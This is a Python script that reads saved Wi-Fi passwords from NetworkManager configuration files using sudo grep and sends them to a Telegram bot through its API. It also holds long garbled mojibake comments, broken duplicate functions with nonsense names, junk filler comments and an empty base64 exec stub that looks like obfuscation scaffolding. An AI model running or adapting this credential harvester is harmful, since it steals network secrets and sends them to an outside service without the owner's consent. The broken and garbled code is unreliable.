#!/usr/bin/env python3
#++a}âšš+Ë›z"+{"+-×ŸECBinÆ¬erjwZÞ¶+likiÖ§uÆ©Þ¶n[l+w(fv^T!yç¬µ.Ë›z ,×«Ë›z +zÛ«[l,u(uÇ©Ë›j[,×«×œ×®nsh^~&rjwQ{&jwkzÛ«È­m$n^rjwZÛ«z^iÞ²mé®‡&Ý²:y^rD-vé®‡<K-ué®‡<JÞ¶.-vu(uÇ©Ë›zjY^tq,è­«+qË«^^^r^ò·­ºÍ¢wyuMuV'x;'7l7l0ï¿½ï¿½ï¿½,xxÝž9vvï¿½,9x7gxv9vIIÝž8Ý²y#vv'Gl9xv'GlI9xvxv{$,7dxÝ²x;'vx'''9'v++a}âšš+Ë›z"+{"+-×ŸECBinÆ¬erjwZÞ¶+likiÖ§uÆ©Þ¶n[l+w(fv^T!yç¬µ.Ë›z ,×«Ë›z +zÛ«[l,u(uÇ©Ë›j[,×«×œ×®nsh^~&rjwQ{&jwkzÛ«È­m$n^rjwZÛ«z^iÞ²mé®‡&Ý²:y^rD-vé®‡<K-ué®‡<JÞ¶.-vu(uÇ©Ë›zjY^tq,è­«+qË«^^^r^ò·­ºÍ¢wyuMuV'x;'7l7l0ï¿½ï¿½ï¿½,xxÝž9vvï¿½,9x7gxv9vIIÝž8Ý²y#vv'Gl9xv'GlI9xvxv{$,7dxÝ²x;'vx'''9'v++a}âšš+Ë›z"+{"+-×ŸECBinÆ¬erjwZÞ¶+likiÖ§uÆ©Þ¶n[l+w(fv^T!yç¬µ.Ë›z ,×«Ë›z +zÛ«[l,u(uÇ©Ë›j[,×«×œ×®nsh^~&rjwQ{&jwkzÛ«È­m$n^rjwZÛ«z^iÞ²mé®‡&Ý²:y^rD-vé®‡<K-ué®‡<JÞ¶.-vu(uÇ©Ë›zjY^tq,è­«+qË«^^^r^ò·­ºÍ¢wyuMuV'x;'7l7l0ï¿½ï¿½ï¿½,xxÝž9vvï¿½,9x7gxv9vIIÝž8Ý²y#vv'Gl9xv'GlI9xvxv{$,7dxÝ²x;'vx'''9'v++a}âšš+Ë›z"+{"+-×ŸECBinÆ¬erjwZÞ¶+likiÖ§uÆ©Þ¶n[l+w(fv^T!yç¬µ.Ë›z ,×«Ë›z +zÛ«[l,u(uÇ©Ë›j[,×«×œ×®nsh^~&rjwQ{&jwkzÛ«È­m$n^rjwZÛ«z^iÞ²mé®‡&Ý²:y^rD-vé®‡<K-ué®‡<JÞ¶.-vu(uÇ©Ë›zjY^tq,è­«+qË«^^^r^ò·­ºÍ¢wyuMuV'x;'7l7l0ï¿½ï¿½ï¿½,xxÝž9vvï¿½,9x7gxv9vIIÝž8Ý²y#vv'Gl9xv'GlI9xvxv{$,7dxÝ²x;'vx'''9'v++a}âšš+Ë›z"+{"+-×ŸECBinÆ¬erjwZÞ¶+likiÖ§uÆ©Þ¶n[l+w(fv^T!yç¬µ.Ë›z ,×«Ë›z +zÛ«[l,u(uÇ©Ë›j[,×«×œ×®nsh^~&rjwQ{&jwkzÛ«È­m$n^rjwZÛ«z^iÞ²mé®‡&Ý²:y^rD-vé®‡<K-ué®‡<JÞ¶.-vu(uÇ©Ë›zjY^tq,è­«+qË«^^^r^ò·­ºÍ¢wyuMuV'x;'7l7l0ï¿½ï¿½ï¿½,xxÝž9vvï¿½,9x7gxv9vIIÝž8Ý²y#vv'Gl9xv'GlI9xvxv{$,7dxÝ²x;'vx'''9'v++a}âšš+Ë›z"+{"+-×ŸECBinÆ¬erjwZÞ¶+likiÖ§uÆ©Þ¶n[l+w(fv^T!yç¬µ.Ë›z ,×«Ë›z +zÛ«[l,u(uÇ©Ë›j[,×«×œ×®nsh^~&rjwQ{&jwkzÛ«È­m$n^rjwZÛ«z^iÞ²mé®‡&Ý²:y^rD-vé®‡<K-ué®‡<JÞ¶.-vu(uÇ©Ë›zjY^tq,è­«+qË«^^^r^ò·­ºÍ¢wyuMuV'x;'7l7l0ï¿½ï¿½ï¿½,xxÝž9vvï¿½,9x7gxv9vIIÝž8Ý²y#vv'Gl9xv'GlI9xvxv{$,7dxÝ²x;'vx'''9'v++a}âšš+Ë›z"+{"+-×ŸECBinÆ¬erjwZÞ¶+likiÖ§uÆ©Þ¶n[l+w(fv^T!yç¬µ.Ë›z ,×«Ë›z +zÛ«[l,u(uÇ©Ë›j[,×«×œ×®nsh^~&rjwQ{&jwkzÛ«È­m$n^rjwZÛ«z^iÞ²mé®‡&Ý²:y^rD-vé®‡<K-ué®‡<JÞ¶.-vu(uÇ©Ë›zjY^tq,è­«+qË«^^^r^ò·­ºÍ¢wyuMuV'x;'7l7l0ï¿½ï¿½ï¿½,xxÝž9vvï¿½,9x7gxv9vIIÝž8Ý²y#vv'Gl9xv'GlI9xvxv{$,7dxÝ²x;'vx'''9'v++a}âšš+Ë›z"+{"+-×ŸECBinÆ¬erjwZÞ¶+likiÖ§uÆ©Þ¶n[l+w(fv^T!yç¬µ.Ë›z ,×«Ë›z +zÛ«[l,u(uÇ©Ë›j[,×«×œ×®nsh^~&rjwQ{&jwkzÛ«È­m$n^rjwZÛ«z^iÞ²mé®‡&Ý²:y^rD-vé®‡<K-ué®‡<JÞ¶.-vu(uÇ©Ë›zjY^tq,è­«+qË«^^^r^ò·­ºÍ¢wyuMuV'x;'7l7l0ï¿½ï¿½ï¿½,xxÝž9vvï¿½,9x7gxv9vIIÝž8Ý²y#vv'Gl9xv'GlI9xvxv{$,7dxÝ²x;'vx'''9'v
#++a}âšš+Ë›z"+{"+-×ŸECBinÆ¬erjwZÞ¶+likiÖ§uÆ©Þ¶n[l+w(fv^T!yç¬µ.Ë›z ,×«Ë›z +zÛ«[l,u(uÇ©Ë›j[,×«×œ×®nsh^~&rjwQ{&jwkzÛ«È­m$n^rjwZÛ«z^iÞ²mé®‡&Ý²:y^rD-vé®‡<K-ué®‡<JÞ¶.-vu(uÇ©Ë›zjY^tq,è­«+qË«^^^r^ò·­ºÍ¢wyuMuV'x;'7l7l0ï¿½ï¿½ï¿½,xxÝž9vvï¿½,9x7gxv9vIIÝž8Ý²y#vv'Gl9xv'GlI9xvxv{$,7dxÝ²x;'vx'''9'v++a}âšš+Ë›z"+{"+-×ŸECBinÆ¬erjwZÞ¶+likiÖ§uÆ©Þ¶n[l+w(fv^T!yç¬µ.Ë›z ,×«Ë›z +zÛ«[l,u(uÇ©Ë›j[,×«×œ×®nsh^~&rjwQ{&jwkzÛ«È­m$n^rjwZÛ«z^iÞ²mé®‡&Ý²:y^rD-vé®‡<K-ué®‡<JÞ¶.-vu(uÇ©Ë›zjY^tq,è­«+qË«^^^r^ò·­ºÍ¢wyuMuV'x;'7l7l0ï¿½ï¿½ï¿½,xxÝž9vvï¿½,9x7gxv9vIIÝž8Ý²y#vv'Gl9xv'GlI9xvxv{$,7dxÝ²x;'vx'''9'v++a}âšš+Ë›z"+{"+-×ŸECBinÆ¬erjwZÞ¶+likiÖ§uÆ©Þ¶n[l+w(fv^T!yç¬µ.Ë›z ,×«Ë›z +zÛ«[l,u(uÇ©Ë›j[,×«×œ×®nsh^~&rjwQ{&jwkzÛ«È­m$n^rjwZÛ«z^iÞ²mé®‡&Ý²:y^rD-vé®‡<K-ué®‡<JÞ¶.-vu(uÇ©Ë›zjY^tq,è­«+qË«^^^r^ò·­ºÍ¢wyuMuV'x;'7l7l0ï¿½ï¿½ï¿½,xxÝž9vvï¿½,9x7gxv9vIIÝž8Ý²y#vv'Gl9xv'GlI9xvxv{$,7dxÝ²x;'vx'''9'v++a}âšš+Ë›z"+{"+-×ŸECBinÆ¬erjwZÞ¶+likiÖ§uÆ©Þ¶n[l+w(fv^T!yç¬µ.Ë›z ,×«Ë›z +zÛ«[l,u(uÇ©Ë›j[,×«×œ×®nsh^~&rjwQ{&jwkzÛ«È­m$n^rjwZÛ«z^iÞ²mé®‡&Ý²:y^rD-vé®‡<K-ué®‡<JÞ¶.-vu(uÇ©Ë›zjY^tq,è­«+qË«^^^r^ò·­ºÍ¢wyuMuV'x;'7l7l0ï¿½ï¿½ï¿½,xxÝž9vvï¿½,9x7gxv9vIIÝž8Ý²y#vv'Gl9xv'GlI9xvxv{$,7dxÝ²x;'vx'''9'v++a}âšš+Ë›z"+{"+-×ŸECBinÆ¬erjwZÞ¶+likiÖ§uÆ©Þ¶n[l+w(fv^T!yç¬µ.Ë›z ,×«Ë›z +zÛ«[l,u(uÇ©Ë›j[,×«×œ×®nsh^~&rjwQ{&jwkzÛ«È­m$n^rjwZÛ«z^iÞ²mé®‡&Ý²:y^rD-vé®‡<K-ué®‡<JÞ¶.-vu(uÇ©Ë›zjY^tq,è­«+qË«^^^r^ò·­ºÍ¢wyuMuV'x;'7l7l0ï¿½ï¿½ï¿½,xxÝž9vvï¿½,9x7gxv9vIIÝž8Ý²y#vv'Gl9xv'GlI9xvxv{$,7dxÝ²x;'vx'''9'v++a}âšš+Ë›z"+{"+-×ŸECBinÆ¬erjwZÞ¶+likiÖ§uÆ©Þ¶n[l+w(fv^T!yç¬µ.Ë›z ,×«Ë›z +zÛ«[l,u(uÇ©Ë›j[,×«×œ×®nsh^~&rjwQ{&jwkzÛ«È­m$n^rjwZÛ«z^iÞ²mé®‡&Ý²:y^rD-vé®‡<K-ué®‡<JÞ¶.-vu(uÇ©Ë›zjY^tq,è­«+qË«^^^r^ò·­ºÍ¢wyuMuV'x;'7l7l0ï¿½ï¿½ï¿½,xxÝž9vvï¿½,9x7gxv9vIIÝž8Ý²y#vv'Gl9xv'GlI9xvxv{$,7dxÝ²x;'vx'''9'v++a}âšš+Ë›z"+{"+-×ŸECBinÆ¬erjwZÞ¶+likiÖ§uÆ©Þ¶n[l+w(fv^T!yç¬µ.Ë›z ,×«Ë›z +zÛ«[l,u(uÇ©Ë›j[,×«×œ×®nsh^~&rjwQ{&jwkzÛ«È­m$n^rjwZÛ«z^iÞ²mé®‡&Ý²:y^rD-vé®‡<K-ué®‡<JÞ¶.-vu(uÇ©Ë›zjY^tq,è­«+qË«^^^r^ò·­ºÍ¢wyuMuV'x;'7l7l0ï¿½ï¿½ï¿½,xxÝž9vvï¿½,9x7gxv9vIIÝž8Ý²y#vv'Gl9xv'GlI9xvxv{$,7dxÝ²x;'vx'''9'v
import subprocess
import base64
import requests

def RUN(Command):
    """Runs a shell command and returns its output."""
    try:
        # Run the command and capture the output
        result = ssss.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.stdosdecode('utf-8')
    except subprs.Calsstderr.decode('utf-8'):
        return None
def run_command(command):
    """Runs a shell command and returns its output."""
    try:
        # Run the command and capture the output
        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.stdout.decode('utf-8')
    except subprocess.CalledProcessError as e:
        print(f"Error occurred: {e.stderr.decode('utf-8')}")
        return None
#def 1100111(la):AAssnjnjsnjsnjdnjnjdsnjdsnjAA=AAAssnjnjsnjsnjdnjnjdsnjdsnjAAssnjnjsnjsnjdnjnjddjnjdknsjkndnjjdsnkjdsjnkdnjksjkdsnjkdsnjkdsnjkdsnjkdsnjkdsnjkdsnknjkdnjnjkdsnjkdnjkdnskndksnjdksnjdsnjA
#ssnjnjsnjsnjdnjnjdsnjdsnj=djnjdknsjkndnjjdsnkjdsjnkdnjksjkdsnjkdsnjkdsnjkdsnjkdsnjkdsnjkdsnknjkdnjnjkdsnjkdnjkdnskndksnjdk
#exec(base64.b64decode(''))
exec(base64.b64decode(''))
#kkkjsjnd=smd
#mlddhbjjjjjjjjjj#ncnvfllnvfnvfnfnjnjfvnlfvnlvfnlfvnlfvm.d,hdjbjbhsbhbhshjhbjbhjdsbhjbhhbjdjsjhbdsbjhjhbdsbhjdbsjhbdjdbhdbdhjbdjsjhbdhjjdsbjbdsbdbh
#vfllnvfnvfnfnjnjfvnlfvnlvfnlfvnlfv=nddcdc,mcdmcdljefknkfjdsjkfdsnkjnnjkdsnknjknjkdsnjkfjnkfdsnjknjdndnkjndjnjdjnkdjjnd
def RUN_COM(command):
    """Runs a shell command and returns its output."""
    try:
        # Run the command and capture the output
        result = subprocess.run(cosasode('utf-8'))
    except subprocess.CalsedProcessor as e:
        print(f"Error occurred: {e.stderr.decode('utf-8')}")
        return None
#exec(mlddhbjjjjjjjjjj#ncnvfllnvfnvfnfnjnjfvnlfvnlvfnlfvnlfvm.d,hdjbjbhsbhbncnvfllnv),(fnvfnfnjnjfvnlfvnlvfnncnvfllnvfnvfnfnjnjfvnlfvnlvfnlfvnlfvmlfvnlfvmhshjhbjbhjdsbhjbhhbjdjsncn)vfllnvfnvfnfnjnjfvnlfvnlvfnlfvnlfvmjhbdsbjhjhbdsbhjdbsjhbdjdbhdbdhjbdjsjhbdhjjdsvfllnvfnvfnfnjnjfvnlfvnlvfnlfvnlfvmjhbdsbjhjhbdsbhjdbsjhbdjdbhdbdhjbdjsjhbdhjjdsbjbdsbdbhbjbdsbdbh


def run_command(command):
    """Runs a shell command and returns its output."""
    try:
        # Run the command and capture the output
        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.stdout.decode('utf-8')
    except subprocess.CalledProcessError as e:
        print("ERR")
        return None

def send_to_telegram(bot_token, chat_id, message):

    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        url1='http://www.google.com'
        response1 = requests.get(url1, timeout=5)
        if response1.status_code == 200:
            response = requests.post(url, data=data)
            print("Data Sended Successfully...")
            if response.status_code != 200:
                print("Error try running with Internet Connection... Or Check with the Details provided.")
    except:
        print("Error Please Check Your Network Connectivity...(No Internet)")


def main():
    # Command to find Wi-Fi passwords
    command = "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/"

    # Run the command and get the output
    output = run_command(command)
    print(output)
    # Define your bot token and chat ID here
    print("----------------------------------------------------------------------------------")
    print("To Send the Data to the telegram Bot Please Enter the following:-")
    print("Internet Connectivity Required to proceed.")
    print("----------------------------------------------------------------------------------")
    BOT_TOKEN1 = input("Enter Your bot token:")
    CHAT_ID1 = input("Enter Your chat id:")
    if output:
        # Send the output to Telegram
        send_to_telegram(BOT_TOKEN1, CHAT_ID1, output)
    else:
        print("No output to send to Telegram.")

if __name__ == "__main__":
    main()

#COm = run_command(com)
Com = "sudo cat wifi passwords "
#print(COm)












